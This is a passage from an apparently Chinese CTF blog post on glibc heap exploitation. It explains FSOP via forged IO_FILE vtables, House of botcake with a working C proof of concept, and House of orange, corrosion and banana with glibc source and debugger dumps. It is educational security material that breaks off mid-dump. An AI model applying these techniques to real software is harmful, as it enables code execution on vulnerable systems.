<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>vtable</code>是虚表指针，其指向的结构体如下，表中的每个函数会完成对应的功能：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_FILE</code>结构体如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">      <span class="type">int</span> _flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">    <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">    <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">    <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">    <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">    <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">    <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    _IO_off_t _old_offset;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">    _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>进程中<code>FILE</code>结构通过<code>_chain</code>域构成一个链表，链表头部为<code>_IO_list_all</code>全局变量，默认情况下依次链接了<code>stderr</code>,<code>stdout</code>,<code>stdin</code>三个文件流，并将新建的流插入到头部，<code>vtable</code>虚表为<code>_IO_file_jumps</code>。</p>
<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>在libc-2.23下由于对vtable没有任何检查，导致可以通过伪造而调用自己想要调用的函数，具体调用方式为<code>exit()</code>函数中的<code>_IO_flush_all_lockp ()</code>函数，其会刷新<code>_IO_list_all</code>链表中的所有文件流，并且会调用<code>_IO_OVERFLOW</code>函数指针，函数调用具体逻辑为：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>由于_IO_FILE结构体中的vtable指针可以被修改，因此可以指向任意我们伪造好的位置。修改好后，只需要满足<code>fp-&gt;mode &lt;= 0 &amp;&amp; fo-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>即可进行调用，且调试发现该函数参数为结构体的第一个元素值</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x7f671d85e550</span> (_IO_2_1_stderr_+<span class="number">16</span>) ◂— <span class="number">0x0</span></span><br><span class="line">*RBX  <span class="number">0x7f671d85e540</span> (_IO_2_1_stderr_) ◂— <span class="string">&#x27;LookHere&#x27;</span></span><br><span class="line">*RCX  <span class="number">0x7f671d85ec30</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x0</span></span><br><span class="line">*RDI  <span class="number">0x7f671d85e540</span> (_IO_2_1_stderr_) ◂— <span class="string">&#x27;LookHere&#x27;</span></span><br><span class="line">*RSI  <span class="number">0xffffffff</span></span><br><span class="line">*R8   <span class="number">0x4</span></span><br><span class="line">*R9   <span class="number">0x0</span></span><br><span class="line">*R10  <span class="number">0x7fff63e6a548</span> —▸ <span class="number">0x7f671da899d8</span> (_rtld_global+<span class="number">2456</span>) —▸ <span class="number">0x7f671d863000</span> ◂— jg     <span class="number">0x7f671d863047</span></span><br><span class="line">*R11  <span class="number">0x3</span></span><br><span class="line">*R12  <span class="number">0x7f671da86700</span> ◂— <span class="number">0x7f671da86700</span></span><br><span class="line">*R13  <span class="number">0x0</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line">*R15  <span class="number">0x2</span></span><br><span class="line">*RBP  <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fff63e6a568</span> —▸ <span class="number">0x7f671d515196</span> ◂— cmp    eax, -<span class="number">1</span></span><br><span class="line">*RIP  <span class="number">0x7f671d4de390</span> (system) ◂— test   rdi, rdi</span><br></pre></td></tr></table></figure></div>

<h3 id="libc-2-24下的攻击"><a href="#libc-2-24下的攻击" class="headerlink" title="libc-2.24下的攻击"></a>libc-2.24下的攻击</h3><p>这部分内容建议看winmt师傅的文章（膜拜）[<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_15" >原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。俺不知道该咋写了</p>
<h2 id="House-of-botcake"><a href="#House-of-botcake" class="headerlink" title="House of botcake"></a>House of botcake</h2><p>这种攻击方法是在tcache中存在key来检测<code>double-free</code>时产生的一种绕过key检测的方法。简单来说就是在程序存在UAF的情况下，通过使unsorted bin和tcache中同时存在某个chunk，来对tcache中chunk的next位进行修改。</p>
<p>简单poc（环境：ubuntu-22.04   libc-2.36）</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> target = <span class="number">0</span>;   	<span class="comment">//目标位置</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//填满tcache</span></span><br><span class="line">	<span class="type">long</span>* x[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	<span class="comment">//x[0]---x[6]  in  tcache</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(x[<span class="number">7</span>]);</span><br><span class="line">	<span class="built_in">free</span>(x[<span class="number">8</span>]);		<span class="comment">//x[7]+x[8]  in  unsorted bin， 并且合成为一个大块</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">long</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);  	<span class="comment">//从tcache中申请出一个chunk</span></span><br><span class="line">	<span class="built_in">free</span>(x[<span class="number">8</span>]);		<span class="comment">//利用UAF将x[8]放入tcache</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//Now, x[8] is in tcache and unsorted bin.</span></span><br><span class="line">	<span class="comment">//We firstly malloc 0x130, and we will control x[8]&#x27;s &#x27;next&#x27; area.</span></span><br><span class="line">	<span class="comment">//x[8]&#x27;s &#x27;next&#x27; area will target on target&#x27;s address.</span></span><br><span class="line">	<span class="type">long</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x130</span>);</span><br><span class="line">	p2[<span class="number">20</span>] = (((<span class="type">long</span>)(&amp;target)&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">4</span>) ^ (x[<span class="number">0</span>][<span class="number">0</span>]);		<span class="comment">//修改next，此处位移是因为要0x10对齐</span></span><br><span class="line"></span><br><span class="line">	<span class="type">long</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="type">long</span>* Ptarget = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we successfully got target.\nPtarget: %p\ntarget&#x27;s address: %p\n&quot;</span>, Ptarget, &amp;target);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>攻击步骤：</strong></p>
<ul>
<li>填满对应大小的tcache，向unsorted bin中填入两个chunkA和chunkB（<strong>A位于B的上方</strong>），这两个chunk会合并为一个大chunk，不能与top chunk合并</li>
<li>从tcache中申请出一个chunk，再次<strong>释放chunkB进入tcache</strong>（不能释放A的原因是合并为大chunk时A的size已经改变）</li>
<li>申请出unsorted bin中的大堆块，并修改chunkB对应next位置的值为target，然后申请两次，即可取出target</li>
</ul>
<p>题目：2020祥云杯 garden [<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-271671.htm" >原创]2020祥云杯garden(house of botcake++)-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><p><code>house of orange</code>是一种组合漏洞的攻击技巧，用<code>unsorted bin attack</code>配合<code>FSOP</code>进行攻击。</p>
<ul>
<li><p>一般可用于程序中没有free函数的情况，可以通过堆溢出来修改top chunk的size（注意页对齐），然后申请大于这个size的chunk，就可以将top chunk放入unsorted bin中</p>
</li>
<li><p>然后使用<code>unsorted bin attack</code>修改<code>_IO_list_all</code>为<code>main_arena+88/96</code>。修改后0x60大小的smallbin链表头正好对应<code>_IO_FILE_PLUS</code>结构中的chain域</p>
</li>
<li><p>这时我们可以在该chunk位置伪造<code>_IO_FILE_PLUS</code>结构体，并且伪造vtable表。触发<code>abort-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</code>执行FSOP。(<code>abort</code>由<code>malloc_printerr</code>调用)</p>
</li>
</ul>
<p>修改unsorted bin的bk位后，再申请内存，程序会执行如下流程：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bck = unsorted_chunks (av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))		<span class="comment">//必进入if，因为之前对unsorted bin进行了伪造，无法满足条件</span></span><br><span class="line">&#123;</span><br><span class="line">     errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再来看errout:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">errout:</span><br><span class="line">   malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br></pre></td></tr></table></figure></div>

<p>errout中有<code>malloc_printerr</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_printerr</span> <span class="params">(<span class="type">int</span> action, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">void</span> *ptr, mstate ar_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Avoid using this arena in future.  We do not attempt to synchronize this</span></span><br><span class="line"><span class="comment">     with anything else because we minimally want to ensure that __libc_message</span></span><br><span class="line"><span class="comment">     gets its resources safely without stumbling on the current corruption.  */</span></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="type">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="type">char</span> *cp = _itoa_word ((<span class="type">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数会调用<code>__libc_message</code>函数或<code>abort</code>函数，而<code>__libc_message</code>函数中也会调用<code>abort</code>函数，因此可以进行FSOP</p>
<p>经典例题：houseoforange_hitcon_2016</p>
<h2 id="House-of-corrosion"><a href="#House-of-corrosion" class="headerlink" title="House of corrosion"></a>House of corrosion</h2><p>参考链接：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6862#toc-0" >https://xz.aliyun.com/t/6862#toc-0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/CptGibbon/House-of-Corrosion" >https://github.com/CptGibbon/House-of-Corrosion <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="攻击条件-1"><a href="#攻击条件-1" class="headerlink" title="攻击条件"></a>攻击条件</h3><ul>
<li>有UAF漏洞</li>
<li>可分配较大堆块</li>
<li>可在无leak的情况下使用</li>
</ul>
<h3 id="攻击效果-1"><a href="#攻击效果-1" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><code>fastbinY</code>数组溢出到目标位置，FSOP直接getshell</p>
<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><ul>
<li>通过<code>unsorted bin attack</code>，修改<code>global_max_fast</code>变量为一个大值。由于没有leak，因此需要爆破出4bit的偏移量。</li>
<li>计算stderr到<code>fastbinY</code>数组的偏移量，通过计算公式<code>chunk size = (delta * 2) + 0x20 ，delta为目标地址与fastbinY的offset</code>，计算出要释放的chunk大小，释放后通过堆风水或者UAF修改堆内容伪造<code>_IO_FILE</code>结构体。</li>
<li>最后通过触发stderr来getshell</li>
</ul>
<h3 id="简单POC-1"><a href="#简单POC-1" class="headerlink" title="简单POC"></a>简单POC</h3><h2 id="House-of-banana"><a href="#House-of-banana" class="headerlink" title="House of banana"></a>House of banana</h2><p>参考链接 [<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31" >原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 <a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/535469996" >高版本glibc堆的几种利用手法 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><code>house of banana</code>是利用<code>exit</code>函数调用链触发的一种利用方式，调用链：<code>exit()-&gt;_dl_fini-&gt;(fini_t)array[i]</code>，利用起来十分方便，只要我们能通过<code>largebin attack</code>等方式劫持<code>_rtld_global</code>首地址<code>_ns_loaded</code>到我们的可控区域，也可以直接劫持某个节点<code>link_map</code>的<code>l_next</code>指针到可控区域，就可以对<code>link_map</code>进行伪造，从而进行调用。</p>
<p>首先我们来看<code>_rtld_global</code>结构体，其中<code>_ns_loaded</code>指向我们要伪造的<code>link_map</code>，是整个链表的头结点，<code>_ns_nloaded</code>表示共有几个<code>link_map</code>，在<code>exit</code>后面的检查中，要求该值不小于3</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = <span class="number">0x7f56e43ba220</span>,    <span class="comment">//#1</span></span><br><span class="line">      _ns_nloaded = <span class="number">4</span>,      <span class="comment">//#2</span></span><br><span class="line"> ...             <span class="comment">//后续变量在该方法中均没有用到</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>_rtld_global</code>结构体的地址可以直接用<code>libcbase + libc.symbols[&#39;_rtld_global&#39;]</code>计算出来，然后我们可以使用<code>largebin attack</code>等方法修改<code>_ns_loaded</code>为可控地址，进而可以在该地址伪造<code>link_map</code></p>
<p><code>link_map</code>结构体</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> link_map *)<span class="number">0x7f56e43ba220</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">94172888551424</span>,       <span class="comment">//伪造为fake_link_map_addr+0x20，</span></span><br><span class="line">  l_name = <span class="number">0x7f56e43ba7c8</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">  l_ld = <span class="number">0x55a655922000</span>,</span><br><span class="line">  l_next = <span class="number">0x7f56e43ba7d0</span>,   <span class="comment">//下一个link_map结构体，伪造保持原来的值</span></span><br><span class="line">  l_prev = <span class="number">0x0</span>,       </span><br><span class="line">  l_real = <span class="number">0x7f56e43ba220</span>,   <span class="comment">//会进行判断是否和当前link_map地址一致，伪造为fake_link_map_addr即可</span></span><br><span class="line">  l_ns = <span class="number">0</span>,</span><br><span class="line">  l_libname = <span class="number">0x7f56e43ba7b0</span>,</span><br><span class="line">  l_info = &#123;<span class="number">0x0</span>, <span class="number">0x55a655922010</span>, <span class="number">0x55a6559220f0</span>, <span class="number">0x55a6559220e0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922090</span>, <span class="number">0x55a6559220a0</span>, <span class="number">0x55a655922120</span>, <span class="number">0x55a655922130</span>, <span class="number">0x55a655922140</span>, <span class="number">0x55a6559220b0</span>, <span class="number">0x55a6559220c0</span>, <span class="number">0x55a655922020</span>, <span class="number">0x55a655922030</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922100</span>, <span class="number">0x55a6559220d0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922110</span>, <span class="number">0x55a655922160</span>, <span class="number">0x55a655922040</span>, <span class="number">0x55a655922060</span>, <span class="number">0x55a655922050</span>, <span class="number">0x55a655922070</span>, <span class="number">0x55a655922000</span>, <span class="number">0x55a655922150</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922180</span>, <span class="number">0x55a655922170</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922160</span>, <span class="number">0x0</span>, <span class="number">0x55a6559221a0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55a655922190</span>, <span class="number">0x0</span> &lt;repeats <span class="number">25</span> times&gt;, <span class="number">0x55a655922080</span>&#125;,   <span class="comment">//#4</span></span><br><span class="line">  l_phdr = <span 